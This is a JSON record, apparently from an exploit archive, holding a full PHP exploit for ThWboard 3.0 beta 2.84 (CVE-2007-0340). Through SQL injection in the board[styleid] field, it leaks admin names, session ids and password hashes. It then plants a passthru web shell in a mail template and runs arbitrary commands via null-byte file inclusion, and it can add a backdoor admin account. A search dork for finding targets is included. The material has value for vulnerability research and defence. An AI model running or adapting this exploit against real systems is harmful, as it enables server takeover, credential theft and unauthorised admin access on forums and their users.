{
  "id": "3124",
  "title": "ThWboard 3.0b2.84-php5 - SQL Injection / Code Execution",
  "cve": "CVE-2007-0340",
  "vuln_type": "sqli",
  "code": "<?php\r\nprint_r('\r\n-----------------------------------------------------------------------------\r\nThWboard <=3.0 beta 2.84-php5 board[styleid] sql injection / cmd exec exploit\r\nby rgod\r\ndork: \"powered by ThWboard\"\r\nversion specific:\r\n\"powered by ThWboard 3 Beta 2.84-php5\" \"by * Baecher & * Gonschorek\"\r\nmail: retrog at alice dot it\r\nsite: http://retrogod.altervista.org\r\n-----------------------------------------------------------------------------\r\n');\r\n\r\nif ($argc<5) {\r\n    print_r('\r\n-----------------------------------------------------------------------------\r\nUsage: php '.$argv[0].' host path action argument [options]\r\nhost:      target server (ip/hostname)\r\npath:      path to ThWboard\r\naction:    [1] launch commands\r\n           [2] disclose md5 hash of a certain user\r\nargument:  a shell comand for action 1\r\n           a username for action 2\r\nOptions:\r\n -a           additionally add a new admin user when action 1\r\n              is performed\r\n -p[port]:    specify a port other than 80\r\n -P[ip:port]: specify a proxy\r\nExamples:\r\nphp '.$argv[0].' localhost /ThWboard/ 1 ls -la -P1.1.1.1:80\r\nphp '.$argv[0].' localhost /ThWboard/ 1 cat ./inc/config.inc.php -P1.1.1.1:80\r\nphp '.$argv[0].' localhost / 2 admin -p81\r\n-----------------------------------------------------------------------------\r\n');\r\n    die;\r\n}\r\n\r\nerror_reporting(\"E_ALL\");\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\n\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$action=(int)$argv[3];\r\nif (($action<>1) and ($action<>2)){die(\"wrong action...\");}\r\n$port=80;\r\n$proxy=\"\";\r\n$argu=\"\";\r\n$admin_add=0;\r\nfor ($i=4; $i<$argc; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif (($temp<>\"-p\") and ($temp<>\"-P\") and ($temp<>\"-a\")) {$argu.=\" \".$argv[$i];}\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n  $tmp=explode(\":\",$proxy);\r\n  $your_ip=$tmp[0];\r\n}\r\nif ($action==1){\r\n   if ($temp==\"-a\"){\r\n       $admin_add=1;\r\n   }\r\n}\r\n}\r\nif (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}\r\nif ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}\r\n\r\nfunction my_encode($my_string)\r\n{\r\n  $encoded=\"CHAR(\";\r\n  for ($k=0; $k<=strlen($my_string)-1; $k++)\r\n  {\r\n    $encoded.=ord($my_string[$k]);\r\n    if ($k==strlen($my_string)-1) {$encoded.=\")\";}\r\n    else {$encoded.=\",\";}\r\n  }\r\n  return $encoded;\r\n}\r\n/*\r\ndownload link: http://www.thwboard.de/downloads.php\r\n\r\nexplaination:\r\nsql injection in /inc/header.inc.php near lines 535-560 ($board[styleid] var):\r\n\r\n...\r\nif(empty($board['styleid']))\r\n{\r\n  if(isset($g_user['styleid']))\r\n    {\r\n      $board['styleid'] = $g_user['styleid'];\r\n    }\r\n  else\r\n    {\r\n      $board['styleid'] = STYLE_DEFAULT;\r\n    }\r\n}\r\n\r\nif( $board['styleid'] == STYLE_DEFAULT )\r\n{\r\n\t$r_style = thwb_query(\"SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, colorbgfont, col_he_fo_font, color_err,\r\n\t\tcol_link, col_link_v, col_link_hover, stdfont,\r\n\t\tboardimage, newtopicimage, border_col FROM\r\n\t\t\".$pref.\"style WHERE styleisdefault=1\");\r\n}\r\nelse\r\n{\r\n\t$r_style = thwb_query(\"SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, colorbgfont, col_he_fo_font, color_err,\r\n\t\tcol_link, col_link_v, col_link_hover, stdfont,\r\n\t\tboardimage, newtopicimage, border_col FROM\r\n\t\t\".$pref.\"style WHERE styleid=$board[styleid]\");\r\n}\r\n...\r\n\r\n( we have this code also in /inc/header.inc.php near lines 74-83:\r\n\r\n...\r\nif( !empty($_REQUEST) )\r\n\textract($_REQUEST, EXTR_SKIP);\r\n\r\nif( get_magic_quotes_gpc() )\r\n{\r\n\t$HTTP_GET_VARS = r_stripslashes($HTTP_GET_VARS);\r\n\t$HTTP_POST_VARS = r_stripslashes($HTTP_POST_VARS);\r\n\t$HTTP_COOKIE_VARS = r_stripslashes($HTTP_COOKIE_VARS);\r\n\t$GLOBALS = r_stripslashes($GLOBALS);\r\n}\r\n...\r\n\r\nso, this works regardless of php.ini settings\r\nthe extract() one turn register_globals =on on undefinied vars\r\nthe second one turn magic_quotes off\r\n)\r\n\r\nalso the styletemplate value of returned array is used to include files locally\r\nnear lines 648-651:\r\n\r\n...\r\nif( file_exists('./templates/' . $style['styletemplate'] . '/dynamic.inc.php') )\r\n{\r\n\t@include('./templates/' . $style['styletemplate'] . '/dynamic.inc.php');\r\n}\r\n...\r\n\r\nso this can used to execute command even if the supplied value is like\r\n'../templates/mail/newreply.mail[null char]'\r\n\r\nand if you insert some code in newreply.mail file as admin\r\n\r\nquery errors and failed includes are showned at screen so you can have the table prefix\r\nand you can extract hashes and session ids from the database:\r\n\r\n...\r\n<pre><b>ThWboard Error</b><br>MySQL: Errore di sintassi nella query SQL vicino\r\n 'mphhhh.../*' linea 4\r\nQuery: SELECT styleid, styletemplate, colorbg, color1, CellA, CellB, color4, co\r\norbgfont, col_he_fo_font, color_err,\r\n                col_link, col_link_v, col_link_hover, stdfont,\r\n                boardimage, newtopicimage, border_col FROM\r\n                tb_style WHERE styleid=[your input]]</pre>\r\n...\r\n<pre>Template error:\r\n unable to load template file: 'templates/[your input]/frame.html' does not exist.</pre>\r\n...\r\n\r\nfinally you do not need to decrypt md5 hashes, you can perform some action as admin\r\nby stealing the session id stored in the database, this one has ten minutes life\r\nand is renewed every time an \"admin action\" is performed by the legitimate\r\nadmin user or by the attacker, also is not deleted after he does logout\r\n\r\nthis exploit tries to launch commands during the admin session id lifetime,\r\nif succeeded you can additionally add a new admin with username 'suntzu' and password 'suntzu'\r\n(action 1) otherwise you can perform action 2 to disclose the hash of a certain user\r\nwhich is used inside cookies to authenticate him to the board (but not to the admin section, if the\r\nhash is the admin user one)\r\n*/\r\n\r\n//disclose table prefix...\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"999999/**/mphhhh.../*\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (!eregi(\"<pre><b>ThWboard Error</b><br>\",$html)){die(\"not vulnerable...\");}\r\n$temp=explode(\"border_col FROM\\n\",$html);\r\n$temp2=explode(\"style WHERE\",$temp[1]);\r\n$prefix=trim($temp2[0]);\r\necho \"table prefix -> \".$prefix.\"\\n\";\r\nif ($action ==1){\r\n\r\n//disclose admin username...\r\n$SQL=\"9999999/**/UNION/**/SELECT/**/null,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/\".$prefix.\"user/**/WHERE/**/userisadmin=1/*\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"$SQL\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (eregi(\"<pre><b>ThWboard Error</b><br>\",$html)){echo $html; die(\"\\n\\nquery error... see html\");}\r\n$temp=explode(\"templates/\",$html);\r\n$temp2=explode(\"/\",$temp[1]);\r\n$admin=$temp2[0];\r\necho \"admin        -> \".$admin.\"\\n\";\r\nif ($admin==\"\"){echo $html; die(\"\\nerror...see html\\n\");}\r\n//if already executed and new admin added, use the suntzu user session id\r\n$SQL=\"9999999/**/UNION/**/SELECT/**/null,sessionid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/\".$prefix.\"session/**/WHERE/**/username=\".my_encode(\"suntzu\").\"/*\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"$SQL\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$temp=explode(\"templates/\",$html);\r\n$temp2=explode(\"/\",$temp[1]);\r\n$sess_id=$temp2[0];\r\nif ($sess_id<>\"\"){\r\n    echo \"session id   -> \".$sess_id.\"\\n\";\r\n}\r\nelse\r\n{\r\n//disclose session id...\r\n$SQL=\"9999999/**/UNION/**/SELECT/**/null,sessionid,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/\".$prefix.\"session/**/WHERE/**/username=\".my_encode(trim($admin)).\"/*\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"$SQL\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$temp=explode(\"templates/\",$html);\r\n$temp2=explode(\"/\",$temp[1]);\r\n$sess_id=$temp2[0];\r\necho \"session id   -> \".$sess_id.\"\\n\";\r\n}\r\nif ($sess_id==\"\"){echo $html; die(\"\\nerror...see html\\n\");}\r\n//inject shell...\r\n$shell=\"<?php error_reporting(0);set_time_limit(0);echo \\\"my_delim\\\";passthru(\\$_SERVER[HTTP_SUNTZU]);echo \\\"my_delim\\\";\";\r\nif ($admin_add){$shell.=\"mysql_query(\\\"INSERT INTO \".$prefix.\"user(userid,username,userpassword,userisadmin,groupids,usernodelete) VALUES ('999999','suntzu','\".md5(\"suntzu\").\"',1,',3,','1')\\\");\";}\r\n$shell.=\"die;?>\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"session\\\";\\r\\n\\r\\n\";\r\n$data.=\"$sess_id\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"action\\\";\\r\\n\\r\\n\";\r\n$data.=\"save_newreply\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"new_newreply\\\";\\r\\n\\r\\n\";\r\n$data.=\"$shell\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"admin/mails.php HTTP/1.0\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\necho \"editing newreply.mail file...\\n\";\r\nif (eregi(\"<form name=\\\"login\\\" method=\\\"post\\\" action=\\\"index.php\\\">\",$html))\r\n{die(\"ten minutes after the last admin action... time exceeded...\");}\r\nelse\r\n{echo \"succeeded...\\n\";\r\n}\r\n\r\n//launch commands...\r\n$SQL=\"9999999/**/UNION/**/SELECT/**/null,\".my_encode(\"../templates/mail/newreply.mail\\x00\").\",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/\".$prefix.\"user/**/WHERE/**/userisadmin=1/*\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"$SQL\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"SUNTZU: \".$argu.\"\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (eregi(\"my_delim\",$html)){\r\n    $temp=explode(\"my_delim\",$html);\r\n    echo $temp[1];\r\n    if ($add_admin) {echo \"admin user added with username 'suntzu' and password 'suntzu'...\";}\r\n}else {echo \"exploit failed...\";}\r\n}\r\nelseif ($action==2)\r\n{\r\n\r\nfunction is_hash($hash)\r\n{\r\n if (ereg(\"([a-f0-9]{32})\",trim($hash))) {return true;}\r\n else {return false;}\r\n}\r\n\r\n$SQL=\"9999999/**/UNION/**/SELECT/**/null,userpassword,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/FROM/**/\".$prefix.\"user/**/WHERE/**/username=\".my_encode(trim($argu)).\"/*\";\r\n$data =\"-----------------------------7d61bcd1f033e\\r\\n\";\r\n$data.=\"Content-Disposition: form-data; name=\\\"board[styleid]\\\";\\r\\n\\r\\n\";\r\n$data.=\"$SQL\\r\\n\";\r\n$data.=\"-----------------------------7d61bcd1f033e--\\r\\n\";\r\n$packet =\"POST \".$p.\"index.php HTTP/1.0\\r\\n\";\r\n$packet.=\"SUNTZU: \".$argu.\"\\r\\n\";\r\n$packet.=\"Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\";\r\n$packet.=\"Connection: close\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nif (eregi(\"<pre><b>ThWboard Error</b><br>\",$html)){echo $html; die(\"\\n\\nquery error... see html\");}\r\n$temp=explode(\"templates/\",$html);\r\n$temp2=explode(\"/\",$temp[1]);\r\n$pwd_hash=$temp2[0];\r\nif (is_hash($pwd_hash)) {\r\n    die(\"pwd hash (md5) -> \".$pwd_hash.\"\\n\");\r\n}\r\nif (eregi(\"templates//frame.html\",$html)){echo \"no user with given name...\\n\";}\r\necho( \"exploit failed...\\n\\n\".$html);\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-01-14]",
  "url": "https://www.exploit-db.com/exploits/3124"
}